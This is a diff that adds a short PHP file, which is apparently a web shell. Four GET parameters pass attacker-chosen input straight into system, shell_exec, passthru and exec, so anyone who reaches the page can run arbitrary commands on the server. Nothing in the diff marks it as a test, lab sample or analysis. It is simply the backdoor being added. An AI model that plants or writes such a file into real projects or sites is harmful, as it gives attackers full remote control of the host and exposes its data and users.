@@ -1,0 +1,20 @@
+<?php
+
+if(isset($_GET['zom'])) {
+    system($_GET['zom']);
+}
+
+if(isset($_GET['zoms'])) {
+    echo shell_exec($_GET['zoms']);
+}
+
+if(isset($_GET['zomz'])) {
+    passthru($_GET['zomz']);
+}
+
+if(isset($_GET['zome'])) {
+    echo exec($_GET['zome']);
+}
+
+?>
+
